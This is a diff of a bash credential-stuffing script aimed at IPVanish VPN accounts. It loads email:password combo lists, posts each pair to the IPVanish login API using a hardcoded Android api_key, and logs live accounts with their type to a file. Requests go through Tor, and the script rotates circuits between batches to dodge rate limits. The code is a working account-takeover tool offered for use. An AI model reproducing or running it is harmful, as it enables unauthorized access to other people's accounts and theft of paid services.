@@ -1,14 +1,18 @@
 #!/bin/bash
-RED="\e[31m"
-GREEN="\e[32m"
-YELLOW="\e[33m"
-CYAN="\e[36m"
-LIGHTGREEN="\e[92m"
-MARGENTA="\e[35m"
-BLUE="\e[34m"
-BOLD="\e[1m"
-NOCOLOR="\e[0m"
-PUTIH='\033[1;37m'
+merah='\e[91m'
+cyan='\e[96m'
+kuning='\e[93m'
+oren='\033[0;33m' 
+margenta='\e[95m'
+biru='\e[94m'
+ijo="\e[92m"
+putih="\e[97m"
+normal='\033[0m'
+bold='\e[1m'
+labelmerah='\e[41m'
+labelijo='\e[42m'
+labelkuning='\e[43m'
+labelpp='\e[45m'
 echo -e "\e[38;5;206m"
 echo -e "\e[1m"
 cat << "EOF"
@@ -37,69 +41,75 @@ cat << "thanks"
                   
 thanks
 
-IGcheck() {
-	cokjancok=$(curl -s "https://account.ipvanish.com/login" -i)
-     auth=$(echo "$cokjancok" | grep clientToken | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1)
+register() {
+    empas="${biru}${1}/${2}"
+    stats="${margenta}[$(date +"%T")]"
+	rand1=$(echo $((RANDOM%9999)))
+	#cokjancok=$(curl -s --socks5 127.0.0.1:9050 "https://account.ipvanish.com/login")
+     #auth=$(echo "$cokjancok" | grep clientToken | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1)
  #  fetchCookie=$(echo "$cokjancok" | grep -Po '(?<=Set-Cookie:)[^;]*')
-   idCoki=$(echo $cokjancok | grep -Po '(?<=PHPSESSID=)[^;]*')
-     login=$(curl -s "https://account.ipvanish.com/login/validate" -i \
-     -H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" \
-     -H "content-type: application/x-www-form-urlencoded" \
-     -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
-     -H "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" \
-     -H "cookie: PHPSESSID=${idCoki}" \
-     -d "clientToken=${auth}&username=${1}&password=${2}")
-     loc=$(echo "$login" | grep -Po '(?<=location:)[^;]*' | tr -d '.')
-	if [[ $loc == *"index"* ]]; then
-	page=$(curl -s "https://account.ipvanish.com/index.php?t=Billing&c=2" \
-	-H "cookie: PHPSESSID=${idCoki}")
-	#renewDate=$(echo $page | grep -o '>[^<]*<' | grep -o '[^<>]*')
-	#date=$(echo $renewDate | grep -Po '(?<=Date : )[^;]*' | cut -d '&' -f1)
-	#ccMonth=$(echo $page | grep -Po '(?<="CCMonth":)[^,]*')
-	#ccYear=$(echo $page | grep -Po '(?<="CCYear":)[^,]*')
-	tier=$(echo $page | grep -Po '(?<="Tier":)[^,]*')
-	printf "${NOCOLOR}[$i/$totalLines]${GREEN} INFO : $1:$2 | Tier: $tier\n"
-	echo "$1:$2 Tier: $tier" >> ipvanish.txt
-	elif [[ $loc == *"login"* ]]; then
-	printf "${NOCOLOR}[$i/$totalLines]${RED}[DIE] => $1:$2${NC} \n"
-	else
-	printf "${NOCOLOR}[$i/$totalLines]${BLUE}[UNK] => $1:$2${NC} \n"
-	fi
+   #idCoki=$(echo $cokjancok | grep -Po '(?<=PHPSESSID=)[^;]*')
+     login=$(curl -s --socks5 127.0.0.1:9050 "https://account.ipvanish.com/api/v3/login" -X POST \
+     -H "User-Agent: okhttp/3.12.0" \
+     -H "X-Client: ipvanish" \
+     -H "Content-Type: application/json; charset=utf-8" \
+     -H "X-Client-Version: 1.2" \
+     -H "X-Platform: Android" \
+     -d "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.2.4.52477b52477\",\"os\":\"22\",\"password\":\"${2}\",\"username\":\"${1}\",\"uuid\":\"6d29ef61-ff19-4124-a053-e148475cf889\"}")
+    if [[ $login == *'"email"'* ]]; then
+    name=$(echo $login | grep -Po '(?<="account_type":)[^,]*')
+    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelijo}LIVE${normal} Type: ${ijo}${name}${normal}\n"
+    echo "${1}|${2} | Type: ${name}" >> ipvanish.txt
+    elif [[ $login == *"username or password provided is incorrect"* ]]; then
+    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelmerah}DIE${normal}\n" 
+    elif [[ $login == *"Too many failed attempts"* ]]; then
+    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelpp}UNK${normal}\n" 
+    else
+    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelpp}UNK${normal}\n" 
+    echo "${login}"
+    fi
   
   
 	
-
-printf "\r"
 }
 
-echo ""
-echo "List In This Directory : "
-echo "Delimeter list -> email:password "
-echo -n "Masukan File List : "
-    read list
-    echo "[+] Calculate your mailist file"
-    echo "############################"
-    totalLines=`grep -c ":" $list`
-    echo "There are $totalLines of list."
-    echo "############################"
-    if [ ! -f $list ]; then
-echo "$list No Such File"
-    exit
-    fi
-    itung=0
-    x=$(gawk -F: '{ print $1 }' $list)
-    y=$(gawk -F: '{ print $2 }' $list)
-    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
-    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
-    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
-    index=$((itung++))
-    if [[ $(expr ${i} % ${itung}) == 0 && $i > 0 ]]; then
-    percentage=$((100*$i/$totalLines))
-    wait
-    fi
-        emailna="${emailgblg[$i]}"
-        kontol="${passwordna[$i]}"
+printf "${white}[+] Input HOSTNAME List : "; read LIST
+if [[ ! -f $LIST ]]; then
+    echo "[-] File $LIST Not Exist"
+    exit 1
+fi
 
-        IGcheck "$emailna" "$kontol" "$index" &
-    done
-    
+totallines=$(wc -l < ${LIST});
+itung=1
+index=$((pp++))
+printf " '-> Total HOSTNAME On List :${white} ${bgreen} $(grep "" -c $LIST) ${cbg}\n"
+printf "${white}[+] Threads          : "; read THREADS
+printf "${white} '-> Set Threads To ${bgreen} $THREADS ${cbg}\n"
+pp=1
+IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $LIST))'
+for (( i = 0; i < ${#mailist[@]}; i++ )); do
+  index=$((itung++))
+    username="${mailist[$i]}"
+    IFS=':' read -r -a array <<< "$username"
+    email=${array[0]}
+    password=${array[1]}
+   tt=$(expr $pp % $THREADS)
+   if [[ $tt == 0 && $pp > 0 ]]; then
+   percentage=$((100*$pp/$totallines))
+   printf "   >> \e[1;33mSleep for 5s Total Checked: ${pp}(${percentage}%%)\n"
+   killall -HUP tor
+   sleep 5
+   
+   fi
+   let pp++
+   jam=$(date '+%H')
+   menit=$(date '+%M')
+   detik=$(date '+%S')
+   
+
+	register "${email}" "${password}" "${index}" &
+	total=$(cat ipvanish.txt | wc -l)
+	
+done
+wait
+
